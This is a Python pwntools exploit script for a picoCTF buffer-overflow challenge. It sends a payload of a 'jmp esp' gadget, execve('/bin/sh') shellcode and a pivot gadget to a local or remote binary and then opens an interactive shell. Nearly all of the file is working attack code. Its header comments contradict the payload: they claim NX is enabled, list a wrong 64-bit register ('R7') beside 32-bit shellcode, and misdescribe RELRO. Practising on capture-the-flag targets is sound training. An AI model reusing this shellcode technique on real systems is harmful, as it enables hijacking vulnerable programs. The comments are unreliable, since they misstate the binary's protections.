#!/usr/bin/env python3
import sys
from pwn import *
context.log_level="debug"
import time
import os
#-----------------------------------------------------------
'''
checksec checks
NX ENABLED - NO SHELLCODE ON THE STACK CAN BE EXECUTED 
PIE ENABLED - THE POSITION KEEPS CHANGING IN THE CODE (POSITION INDEPENDENT EXECUTABLE)
PARTIAL RELRO- CAN READ ONLY A FEW BYTES ALTHOUGH NOT THAT IMPORTANT
#calling conventions
 RDI,RSI,RDX,RCX,R8,R7 ...
'''
#============================#============================#============================
gdb_script='''
	b *0x401498
'''

path="./boverflow"
def check():
	log.warning(os.system(f'file {path}'))
	log.warning(os.system(f'checksec {path}'))
	log.warning(os.system(f'ldd {path}'))

if os.path.exists("./flag.txt")==False:
	with open("flag.txt","w") as flag:
		flag.write("flag{pwned_m0T******}")
elf = context.binary=ELF(path,checksec=True)
HOST="saturn.picoctf.net"
PORT= 50266
context.binary = elf
p=process(path)
argument=sys.argv[1]
if argument=="l":
    p=process(path)
if argument=="r":
	p=remote(HOST,PORT)
if argument=='g':
	p=process(path)
	gdb.attach(p,gdbscript=gdb_script)


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.strip().ljust(4, b'\0'))
uu64    = lambda data               :u64(data.strip().ljust(8, b'\0'))
ia 		= lambda 					: p.interactive()
rl 		= lambda 					: p.recvline()
#=======================================================================================
shellcode=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
gadgets={
	'pivot':0x080484fd,
	'jmpesp':0x08048504
}
payload=flat([
	gadgets['jmpesp'],
	shellcode,
	"1"*(0x20-len(shellcode)),
	gadgets['pivot']
	])
sla("name?",payload)
ia()
